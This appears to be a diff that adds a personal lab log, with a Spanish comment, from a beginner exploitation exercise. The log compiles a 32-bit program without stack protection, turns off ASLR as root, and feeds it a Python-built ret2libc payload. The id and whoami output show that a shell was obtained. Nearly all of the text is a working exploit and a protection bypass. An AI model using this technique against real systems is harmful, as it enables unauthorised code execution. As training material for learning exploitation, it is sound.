@@ -1,0 +1,19 @@
+$ gcc -m32 -fno-stack-protector -o level2 level1.c 
+
+ //deshabilito proteccion ASLR que rondomiza direcciones, ya lo habia hecho pero se activa luego de un tiempo
+
+#!bash
+sudo -s 
+echo 0 > /proc/sys/kernel/randomize_va_space
+exit
+
+$ (python -c "import struct;print(('A'*140) + struct.pack('I',0xf7e195a0) + struct.pack('I', 0xdeadbeef)+ struct.pack('I', 0xf7f58b35)*4)"; cat) | ./level2
+
+id
+uid=1000(ivansk8421) gid=1000(ivansk8421) grupos=1000(ivansk8421),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),118(lpadmin),129(sambashare)
+whoami 
+ivansk8421
+
+
+
+
